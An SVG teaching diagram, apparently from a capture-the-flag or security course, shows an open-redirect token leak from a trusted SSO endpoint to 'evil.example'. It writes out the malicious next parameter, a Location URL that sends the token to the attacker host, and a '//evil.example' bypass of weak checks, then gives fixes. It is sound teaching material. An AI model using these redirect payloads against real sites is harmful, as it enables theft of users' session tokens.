<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 380" font-family="'Chakra Petch','Segoe UI',Arial,sans-serif">
  <rect x="0" y="0" width="800" height="380" rx="12" fill="#0d121d" stroke="#263451"/>
  <text x="400" y="34" text-anchor="middle" font-size="17" font-weight="700" fill="#e3fffa">Open redirect and token leak</text>
  <text x="400" y="56" text-anchor="middle" font-size="12" fill="#6c7b93" font-family="'JetBrains Mono',monospace">a trusted host redirects to a URL the attacker chose</text>

  <defs>
    <marker id="a" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
      <path d="M0,0 L7,3 L0,6 z" fill="#6c7b93"/>
    </marker>
  </defs>

  <!-- victim browser -->
  <g text-anchor="middle" font-size="12">
    <rect x="28" y="150" width="140" height="60" rx="7" fill="#111827" stroke="#00f0ff"/>
    <text x="98" y="176" fill="#e3fffa">Victim browser</text>
    <text x="98" y="195" fill="#9fb0c8" font-size="10.5">trusts the domain</text>
  </g>

  <!-- trusted app -->
  <g text-anchor="middle" font-size="12">
    <rect x="236" y="138" width="190" height="84" rx="7" fill="#111827" stroke="#ff2a6d"/>
    <text x="331" y="162" fill="#e3fffa" font-weight="700">trusted.local /sso</text>
    <text x="331" y="183" fill="#9fb0c8" font-size="10.5" font-family="'JetBrains Mono',monospace">?next=evil.example</text>
    <text x="331" y="200" fill="#ff2a6d" font-size="11">302 Location: next</text>
    <text x="331" y="215" fill="#ff2a6d" font-size="11">+ token in the URL</text>
  </g>

  <!-- attacker site -->
  <g text-anchor="middle" font-size="12">
    <rect x="596" y="150" width="176" height="60" rx="7" fill="#0b1518" stroke="#fcee0a" stroke-dasharray="5 4"/>
    <text x="684" y="176" fill="#e3fffa">evil.example</text>
    <text x="684" y="195" fill="#fcee0a" font-size="10.5">collects the token</text>
  </g>

  <!-- attacker-controlled param in -->
  <path d="M168 180 L 232 180" stroke="#00f0ff" stroke-width="2" fill="none" marker-end="url(#a)" stroke-dasharray="5 4"/>
  <!-- 302 follow out -->
  <path d="M426 180 L 592 180" stroke="#6c7b93" stroke-width="2" fill="none" marker-end="url(#a)"/>

  <!-- leaked location -->
  <g font-size="11" font-family="'JetBrains Mono',monospace">
    <rect x="236" y="256" width="536" height="46" rx="7" fill="#0b1518" stroke="#fcee0a"/>
    <text x="250" y="284" fill="#9fb0c8">Location: https://evil.example/collect?token=FLAG{...}</text>
  </g>
  <line x1="331" y1="256" x2="331" y2="224" stroke="#fcee0a" stroke-width="2" marker-end="url(#a)" opacity="0.85"/>

  <text x="400" y="334" text-anchor="middle" font-size="11" fill="#6c7b93">The link starts on the trusted host, so the victim is off guard; weak checks like startswith("/") fall to //evil.example.</text>
  <text x="400" y="356" text-anchor="middle" font-size="11" fill="#6c7b93">Fix: allowlist the destination, keep it same-origin, and never put a token in a redirect URL.</text>
</svg>
